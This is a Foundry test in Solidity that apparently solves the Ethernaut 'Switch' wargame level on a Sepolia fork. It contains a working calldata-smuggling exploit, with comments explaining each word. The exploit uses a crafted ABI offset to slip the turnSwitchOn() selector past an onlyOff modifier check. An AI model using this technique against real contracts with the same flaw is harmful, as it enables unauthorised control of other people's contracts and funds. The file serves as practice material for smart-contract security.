// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface Switch{
    function flipSwitch(bytes memory _data) external;
    function switchOn() external view returns (bool);
}


contract SwitchTest is Test {
    function setUp() public{
        vm.createSelectFork("sepolia", 5535276);
    }
    function test_switch() public{
        address instance = 0xd38112133E2162c7E87204a7D0C8cC535d7c4143;
        address player = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;

        vm.startPrank(player);

        // call data smuggling
        // 0x30c13ade  + 4                                                       // selector for flipSwitch(bytes)
        // 0000000000000000000000000000000000000000000000000000000000000060 + 32 // 0x60 offset to start the data
        // 0000000000000000000000000000000000000000000000000000000000000004 + 32 // ignored, just to pass the onlyOff modifier
        // 20606e1500000000000000000000000000000000000000000000000000000000 + 32 // this passes the onlyOff modifier check, however it's not the calldata gets executed
        // 0000000000000000000000000000000000000000000000000000000000000004 + 32 // start of the data
        // 76227e1200000000000000000000000000000000000000000000000000000000 + 32 // 0x76227e120: selector for turnSwitchOn()

        bytes memory data = hex'30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000';
        instance.call(data);

        require(Switch(instance).switchOn(), "Switch is not on");
    }
}
